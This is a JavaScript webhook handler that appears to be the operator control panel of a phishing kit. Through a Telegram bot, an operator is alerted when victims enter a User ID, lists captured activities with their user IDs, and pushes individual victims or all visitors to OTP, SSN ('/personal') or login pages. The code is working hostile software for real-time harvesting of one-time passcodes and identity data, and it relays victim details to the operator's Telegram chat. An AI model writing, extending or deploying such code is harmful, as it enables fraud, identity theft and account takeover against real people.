// Telegram webhook endpoint
// Receives updates from Telegram and processes commands

import { sendTelegramMessage } from '../telegram';
import { getRecentActivities } from '../kv-client';

export default async function handler(req, res) {
  if (req.method === 'POST') {
    const update = req.body;
    
    // Handle callback queries (button clicks)
    if (update.callback_query) {
      const callback = update.callback_query;
      const data = callback.data;
      const chatId = callback.message.chat.id;
      const messageId = callback.message.message_id;
      
      console.log('[telegram] Received callback:', data);
      
      // Handle redirect buttons - REDIRECT ALL USERS IMMEDIATELY
      if (data.startsWith('redirect_')) {
        const redirectType = data.replace('redirect_', '').split('_')[0]; // Get redirect type (otp, ssn, login)
        
        let pagePath = '/';
        if (redirectType === 'otp') {
          pagePath = '/otp';
        } else if (redirectType === 'ssn') {
          pagePath = '/personal';
        } else if (redirectType === 'login') {
          pagePath = '/';
        }
        
        console.log('[telegram] 🚀 REDIRECTING ALL USERS TO:', pagePath);
        
        // Answer callback query immediately
        const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            callback_query_id: callback.id,
            text: `Redirecting all users to ${redirectType.toUpperCase()} PAGE`
          })
        });
        
        try {
          // Determine base URL
          let baseUrl = process.env.NEXT_PUBLIC_APP_URL;
          if (!baseUrl) {
            const protocol = req.headers['x-forwarded-proto'] || 'https';
            const host = req.headers['x-forwarded-host'] || req.headers.host;
            baseUrl = host ? `${protocol}://${host}` : 'https://your-project.vercel.app';
          }
          
          // Set global redirect - ALL users will be redirected
          const redirectResponse = await fetch(`${baseUrl}/api/redirect/all`, {
            method: 'POST',
            headers: { 
              'Content-Type': 'application/json',
              'User-Agent': 'Telegram-Bot-Webhook'
            },
            body: JSON.stringify({
              redirectType: redirectType,
              pagePath: pagePath
            })
          });
          
          if (redirectResponse.ok) {
            const redirectResult = await redirectResponse.json();
            console.log('[telegram] ✅ Global redirect set:', JSON.stringify(redirectResult, null, 2));
            
            // Verify redirect was stored by checking latest endpoint
            try {
              const verifyResponse = await fetch(`${baseUrl}/api/redirect/latest?t=${Date.now()}`);
              if (verifyResponse.ok) {
                const verifyData = await verifyResponse.json();
                if (verifyData.redirect) {
                  console.log('[telegram] ✅✅✅ VERIFIED: Redirect is accessible ✅✅✅');
                  console.log('[telegram] Verified redirect:', verifyData.pagePath);
                  await sendTelegramMessage(
                    `✅ Redirecting ALL users to ${redirectType.toUpperCase()} PAGE\n` +
                    `Path: ${pagePath}\n` +
                    `✅ Verified and ready`,
                    chatId
                  );
                } else {
                  console.warn('[telegram] ⚠️ Redirect set but not verified');
                  await sendTelegramMessage(
                    `✅ Redirect set but verification pending\n` +
                    `Path: ${pagePath}`,
                    chatId
                  );
                }
              } else {
                console.warn('[telegram] Could not verify redirect');
                await sendTelegramMessage(
                  `✅ Redirect set to ${redirectType.toUpperCase()} PAGE\n` +
                  `Path: ${pagePath}`,
                  chatId
                );
              }
            } catch (verifyError) {
              console.error('[telegram] Verification error:', verifyError);
              await sendTelegramMessage(
                `✅ Redirect set to ${redirectType.toUpperCase()} PAGE\n` +
                `Path: ${pagePath}`,
                chatId
              );
            }
          } else {
            const errorText = await redirectResponse.text();
            console.error('[telegram] ❌ Redirect failed:', redirectResponse.status, errorText);
            await sendTelegramMessage(
              `❌ Failed to set redirect: ${redirectResponse.status}\n` +
              `Error: ${errorText.substring(0, 100)}`,
              chatId
            );
          }
        } catch (error) {
          console.error('[telegram] Error:', error);
        }
        
        return res.status(200).json({ ok: true });
      }
      
      // Handle approve buttons for activities
      if (data.startsWith('approve_')) {
        const parts = data.split('_');
        const redirectType = parts[1]; // otp, ssn, login
        const activityId = parts.slice(2).join('_');
        
        try {
          const baseUrl = process.env.NEXT_PUBLIC_APP_URL || 
                         (req.headers.host ? `https://${req.headers.host}` : 'http://localhost:3000');
          
          const approveResponse = await fetch(`${baseUrl}/api/approve`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              activityId: activityId,
              redirectType: redirectType
            })
          });
          
          const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
          if (approveResponse.ok) {
            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                callback_query_id: callback.id,
                text: `✅ Redirected to ${redirectType.toUpperCase()} PAGE`
              })
            });
            
            await sendTelegramMessage(
              `✅ Approved activity ${activityId}\nUser redirected to ${redirectType.toUpperCase()} PAGE.`,
              chatId
            );
          } else {
            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                callback_query_id: callback.id,
                text: `❌ Error approving`
              })
            });
          }
        } catch (error) {
          console.error('[telegram] Error approving:', error);
          const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
          await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              callback_query_id: callback.id,
              text: `❌ Error: ${error.message}`
            })
          });
        }
        
        return res.status(200).json({ ok: true });
      }
    }
    
    // Handle webhook updates from Telegram
    if (update.message) {
      const message = update.message;
      const text = message.text || '';
      const chatId = message.chat.id;
      
      console.log('[telegram] Received message:', text, 'from chat:', chatId);
      
      // Handle /start command
      if (text.startsWith('/start')) {
        await sendTelegramMessage(
          '🤖 Bot activated!\n\n' +
          'You will receive notifications when users enter their User ID.\n' +
          'Use /approve_<activityId> to approve and redirect to OTP page.',
          chatId
        );
        return res.status(200).json({ ok: true });
      }
      
      // Handle /approve_<activityId> command
      if (text.startsWith('/approve_')) {
        const activityId = text.replace('/approve_', '').trim();
        
        if (!activityId) {
          await sendTelegramMessage('Usage: /approve_<activityId>', chatId);
          return res.status(200).json({ ok: true });
        }
        
        try {
          // Call internal approve API
          const baseUrl = process.env.NEXT_PUBLIC_APP_URL || 
                         (req.headers.host ? `https://${req.headers.host}` : 'http://localhost:3000');
          
          const approveResponse = await fetch(`${baseUrl}/api/approve`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              activityId: activityId,
              redirectType: 'otp'
            })
          });
          
          if (approveResponse.ok) {
            await sendTelegramMessage(
              `✅ Approved activity ${activityId}\nUser redirected to OTP page.`,
              chatId
            );
          } else {
            await sendTelegramMessage(
              `❌ Error approving activity ${activityId}`,
              chatId
            );
          }
        } catch (error) {
          console.error('[telegram] Error approving:', error);
          await sendTelegramMessage(`❌ Error: ${error.message}`, chatId);
        }
        
        return res.status(200).json({ ok: true });
      }
      
      // Handle /activities command
      if (text === '/activities') {
        try {
          const baseUrl = process.env.NEXT_PUBLIC_APP_URL || 
                         (req.headers.host ? `https://${req.headers.host}` : 'http://localhost:3000');
          
          const activitiesResponse = await fetch(`${baseUrl}/api/activities`);
          const activitiesData = await activitiesResponse.json();
          
          if (activitiesData.success && activitiesData.activities && activitiesData.activities.length > 0) {
            let message = '📋 <b>Recent Activities:</b>\n\n';
            activitiesData.activities.slice(0, 5).forEach(activity => {
              message += `ID: <code>${activity.id}</code>\n`;
              message += `User: <code>${activity.userId || 'N/A'}</code>\n`;
              message += `Type: ${activity.type}\n`;
              message += `/approve_${activity.id}\n\n`;
            });
            await sendTelegramMessage(message, chatId);
          } else {
            await sendTelegramMessage('No activities found.', chatId);
          }
        } catch (error) {
          await sendTelegramMessage(`❌ Error: ${error.message}`, chatId);
        }
        
        return res.status(200).json({ ok: true });
      }
    }
    
    return res.status(200).json({ ok: true });
  } else {
    res.status(405).json({ error: 'Method not allowed' });
  }
}

